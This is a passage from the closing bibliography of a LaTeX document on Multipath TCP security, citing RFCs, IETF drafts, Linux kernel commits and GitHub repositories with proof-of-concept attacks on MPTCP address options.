O. Mehani, R. Holz, S. Ferlin, R. Boreli,
``An Early Look at Multipath TCP Deployment in the Wild'',
Proceedings of the 6th International Workshop on Hot Topics in Planet-Scale Measurement, 
Paris, France, 2015,
pp.\ 7-12, 
\doi{10.1145/2798087.2798088}

\bibitem{rfc6181} 
M. Bagnulo,
``Threat Analysis for TCP Extensions for Multipath Operation with Multiple Addresses'',
\rfc{6181},  March 2011

\bibitem{rfc6824bis}
A. Ford, C. Raiciu, M. Handley, O. Bonaventure, C. Paasch,
``TCP Extensions for Multipath Operation with Multiple Addresses draft-ietf-mptcp-rfc6824bis'',
\rfc{6824bis},  January 2016

\bibitem{rfc2827}
P. Ferguson, D. Senie,
``Network Ingress Filtering: Defeating Denial of Service Attacks which employ IP Source Address Spoofing'',
\rfc{2827},  May 2000

\bibitem{rfc4987} 
W. Eddy,
``TCP SYN Flooding Attacks and Common Mitigations'',
\rfc{4987},  August 2007

\bibitem{hashchain} 
[multipathtcp] Hash Chain Security Solution, 
\url{https://www.ietf.org/mail-archive/web/multipathtcp/current/msg01275.html}

\bibitem{rfc6101} 
A. O. Freier, P. Karlton, P. C. Kocher,
``The Secure Sockets Layer (SSL) Protocol Version 3.0'',
\rfc{6101},  August 2011

\bibitem{paasch-mptcp-ssl-00} 
C. Paasch, O. Bonaventure,
``Securing the MultiPath TCP handshake with external keys'',
\url{https://tools.ietf.org/html/draft-paasch-mptcp-ssl-00}, 
April 2013

\bibitem{draft-bagnulo-mptcp-secure} 
M. B. Braun,
``Secure MPTCP'',
\url{https://tools.ietf.org/id/draft-bagnulo-mptcp-secure-00.txt}, 
February 2014

\bibitem{ietf-tcpinc-tcpcrypt-00} 
A. Bittau, D. Boneh, D. B. Giffin, M. Hamburg, M. J. Handley, D. Mazieres, Q. Slack, E. W. Smith,
``Cryptographic protection of TCP Streams (tcpcrypt)'',
\url{https://tools.ietf.org/html/draft-ietf-tcpinc-tcpcrypt-00}, 
November 2015

\bibitem{rfc6056}
M. V. Larsen, P. Gont,
``Recommendations for Transport-Protocol Port Randomization'',
\rfc{6056},  January 2011

\bibitem{rfc7039} 
J. Wu, J. Bi, M. Bagnulo, F. Baker, C. Vogt,
``Source Address Validation Improvement (SAVI) Framework'',
\rfc{7039},  October 2013

\bibitem{rfc6824bis04} 
A. Ford, C. Raiciu, M. Handley, O. Bonaventure, C. Paasch,
``TCP Extensions for Multipath Operation with Multiple Addresses draft-ietf-mptcp-rfc6824bis-04'',
\rfc{6824bis-04},  March 2015

\bibitem{rfc6824bis05} 
A. Ford, C. Raiciu, M. Handley, O. Bonaventure, C. Paasch,
``TCP Extensions for Multipath Operation with Multiple Addresses draft-ietf-mptcp-rfc6824bis-05'',
\rfc{6824bis-05},  January 2016

\bibitem{rfc5061} 
R. R. Stewart, Q. Xie, M. Tuexen, S. Maruyama, M. Kozuka,
``Stream Control Transmission Protocol (SCTP) Dynamic Address Reconfiguration'',
\rfc{5061},  September 2007

\bibitem{BPB11} 
S. Barr{\'e}, C. Paasch, O. Bonaventure, 
``MultiPath TCP: From Theory to Practice'',
Proceedings of the 10th International IFIP TC 6 Conference on Networking - Volume Part I,
Valencia, Spain, 2011, 
pp.\ 444-457

\bibitem{cryptoinkernel}
J. Hesterberg, Kernel development,
\url{http://lwn.net/Articles/13587/}

\bibitem{cryptopatch1} 
mptcp: Use kernel crypto API for MPTCP HMAC, 
\url{https://github.com/multipath-tcp/mptcp_net-next/commit/9c0495f9159d2843129ab97e5b7d4202bccd7341} 

\bibitem{cryptopatch2} 
mptcp: Preallocate aligned HMAC key's placeholder, 
\url{https://github.com/multipath-tcp/mptcp_net-next/commit/06e7644bdac1ac6e97767bc714586fbfadcdeaa8} 

\bibitem{shash61}
Linux/crypto/shash.c - Line 61,
\url{http://lxr.free-electrons.com/source/crypto/shash.c#L61}

\bibitem{shash43}
Linux/crypto/shash.c - Line 43,
\url{http://lxr.free-electrons.com/source/crypto/shash.c#L43}

\bibitem{patch1}
mptcp: Add MPTCP version control,
\url{https://github.com/multipath-tcp/mptcp/commit/c9b4b66a0e544b3eae5d898206b5a28628b728a7}

\bibitem{patch2}
mptcp: Make 'mptcp\_hmac\_sha1' more flexible,
\url{https://github.com/multipath-tcp/mptcp/commit/f860de960e19cb557400c08e49288af63c51319f} 

\bibitem{patch3}
mptcp: Add ADD\_ADDR2 option,
\url{https://github.com/multipath-tcp/mptcp/commit/de09a83186666c67c9831057a83ba426f91fbea3} 

\bibitem{patch4} 
mptcp: Add IPv6 support for ADD\_ADDR2, 
\url{https://github.com/multipath-tcp/mptcp/commit/8e86cf262108513296ac0952f2ffef717dc12f4b} 

\bibitem{patch5} 
mptcp: Check tcp\_sock pointer not null in mptcp\_parse\_options(), 
\url{https://github.com/multipath-tcp/mptcp/commit/8f0c5dde7f57603aaf134a0f1c2a42d1a1236c8f} 

\bibitem{blog} 
Multipath TCP News : January 2016, 
\url{http://blog.multipath-tcp.org/blog/html/2016/01/05/mptcpnews.html#}

\bibitem{maillist} 
[multipathtcp] RFC6824bis-04 ADD\_ADDR2 comments, 
\url{https://mailarchive.ietf.org/arch/search/?email_list=multipathtcp&q=RFC6824bis-04+ADD_ADDR2+comments}

\bibitem{errata} 
RFC 7430, Errata ID: 4565, 
\url{http://www.rfc-editor.org/errata_search.php?rfc=7430&eid=4565}

\bibitem{wireshark} 
MPTCP: Update ADD\_ADDR option to RFC6824bis-04, 
\url{https://github.com/wireshark/wireshark/commit/98fd9b852446ada31d47c158e022c545d0bc7f42}

\bibitem{auth751} 
Linux/net/sctp/auth.c - Line 751, 
\url{http://lxr.free-electrons.com/source/net/sctp/auth.c#L751}

\bibitem{cryptomail} 
"crypto\_hash\_setkey" call from atomic context, 
\url{http://comments.gmane.org/gmane.linux.kernel.cryptoapi/17937}

\bibitem{rfc2202} 
P.-C. Cheng, R. Glenn,
``Test Cases for HMAC-MD5 and HMAC-SHA-1'',
\rfc{2202},  September 1997

\bibitem{add-addr2-eav} 
MPTCP-Exploit/add-addr2-eav, 
\url{https://github.com/fabriziodemaria/MPTCP-Exploit/tree/add-addr2-eav}

\bibitem{P14}
C. Paasch,
``Improving Multipath TCP'',
UCLouvain / ICTEAM / EPL, November 2014

\bibitem{add-addr-flood} 
MPTCP-Exploit/add-addr-flood, 
\url{https://github.com/fabriziodemaria/MPTCP-Exploit/tree/add-addr-flood}

\bibitem{add-addr-2-flood} 
MPTCP-Exploit/add-addr-2-flood, 
\url{https://github.com/fabriziodemaria/MPTCP-Exploit/tree/add-addr-2-flood}

\bibitem{monitor} 
CPU\_Monitor, 
\url{https://github.com/fabriziodemaria/CPU_Monitor}

\end{thebibliography}


\end{document}
